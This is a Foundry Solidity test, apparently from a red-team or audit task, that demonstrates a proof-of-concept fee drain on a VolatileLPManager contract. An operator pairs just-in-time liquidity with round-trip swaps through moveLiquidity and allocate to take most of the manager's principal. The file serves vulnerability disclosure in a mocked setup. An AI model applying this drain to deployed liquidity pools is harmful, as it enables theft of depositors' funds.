// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console2} from "forge-std/Test.sol";
import {RedTeamBase} from "./RedTeamTask053.t.sol";
import {VolatileLPManager} from "../src/VolatileLPManager.sol";
import {MockERC20} from "./helpers/Mocks.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {ModifyLiquidityParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";

contract PoCRoundTripFeeDrain is RedTeamBase {
    bytes32 constant SALT2 = bytes32(uint256(2));
    bytes32 constant SALT3 = bytes32(uint256(3));

    function setUp() public {
        // 0.30% pool, thin unrelated LP, manager funded 100/100 (real Chainlink oracle: swap tol 100 bps).
        _boot(3000, 60, 1e21, 100e18, 100e18);
        VolatileLPManager.VolatileAllocLeg[] memory legs = new VolatileLPManager.VolatileAllocLeg[](1);
        legs[0] = _leg(SALT, false, 0, 100e18, 100e18);
        vm.prank(owner);
        mgr.allocate(legs);
        vm.startPrank(bot);
        MockERC20(Currency.unwrap(c0)).approve(address(lpRouter), type(uint256).max);
        MockERC20(Currency.unwrap(c1)).approve(address(lpRouter), type(uint256).max);
        vm.stopPrank();
    }

    function _leg(bytes32 salt, bool zfo, uint256 swapIn, uint256 a0, uint256 a1)
        internal view returns (VolatileLPManager.VolatileAllocLeg memory)
    {
        return VolatileLPManager.VolatileAllocLeg({
            poolId: pid, salt: salt, tickLower: -600, tickUpper: 600, zeroForOne: zfo, swapAmountIn: swapIn,
            swapPriceLimit: zfo ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1,
            minAmountOut: 0, amount0Desired: a0, amount1Desired: a1, minLiquidity: 0
        });
    }

    function _jit(int256 L) internal {
        vm.prank(bot);
        lpRouter.modifyLiquidity(key, ModifyLiquidityParams({tickLower: -60, tickUpper: 60, liquidityDelta: L, salt: bytes32("jit")}), "");
    }

    function _bal(address who) internal view returns (uint256 a, uint256 b) {
        a = MockERC20(Currency.unwrap(c0)).balanceOf(who);
        b = MockERC20(Currency.unwrap(c1)).balanceOf(who);
    }

    /// NEW in v2.2.0: one operator `moveLiquidity` (bridge X->Y + add pre-swap Y->X, same configured pool).
    function test_moveBridge_roundTrip_drainsPrincipal() public {
        uint128 L = mgr.positionOf(SALT).liquidity;
        (uint256 b0, uint256 b1) = _bal(bot);
        uint256 V = 15_000e18;
        _jit(1e27); // operator JIT liquidity around the current tick (flash-loanable)
        VolatileLPManager.BridgeSwap memory br = VolatileLPManager.BridgeSwap({
            poolId: pid, zeroForOne: true, amountIn: V, priceLimit: TickMath.MIN_SQRT_PRICE + 1, minOut: 0
        });
        vm.prank(bot);
        mgr.moveLiquidity(SALT, L, _leg(SALT2, false, V * 9969 / 10000, 1e15, 1e15), br);
        _jit(-1e27);
        (uint256 m0, uint256 m1) = _bal(address(mgr));
        (uint256 a0, uint256 a1) = _bal(bot);
        console2.log("manager idle c0/c1 after (was ~100/100 in position):", m0 / 1e15, m1 / 1e15);
        console2.log("operator gain c0 (milli):", int256(a0) - int256(b0));
        console2.log("operator gain c1 (milli):", int256(a1) - int256(b1));
        assertLt(m0 + m1, 120e18, "manager lost > 40% of principal in one operator op");
    }

    /// Same mechanic, pre-existing: two-leg operator `allocate` on idle funds.
    function test_allocate_twoLegs_roundTrip_drainsIdle() public {
        uint128 L = mgr.positionOf(SALT).liquidity;
        vm.prank(owner); // owner returns the principal to idle first (owner op, not counted)
        mgr.moveLiquidity(SALT, L, _leg(SALT3, false, 0, 1e15, 1e15));
        (uint256 i0, uint256 i1) = _bal(address(mgr));
        (uint256 b0, uint256 b1) = _bal(bot);
        uint256 V = 15_000e18;
        _jit(1e27);
        VolatileLPManager.VolatileAllocLeg[] memory legs = new VolatileLPManager.VolatileAllocLeg[](2);
        legs[0] = _leg(SALT2, true, V, 1e15, 1e15);
        legs[1] = _leg(SALT2, false, V * 9969 / 10000, 1e15, 1e15);
        vm.prank(bot);
        mgr.allocate(legs);
        _jit(-1e27);
        (uint256 m0, uint256 m1) = _bal(address(mgr));
        (uint256 a0, uint256 a1) = _bal(bot);
        console2.log("manager idle before:", i0 / 1e15, i1 / 1e15);
        console2.log("manager idle after :", m0 / 1e15, m1 / 1e15);
        console2.log("operator gain c0:", int256(a0) - int256(b0));
        console2.log("operator gain c1:", int256(a1) - int256(b1));
    }
}
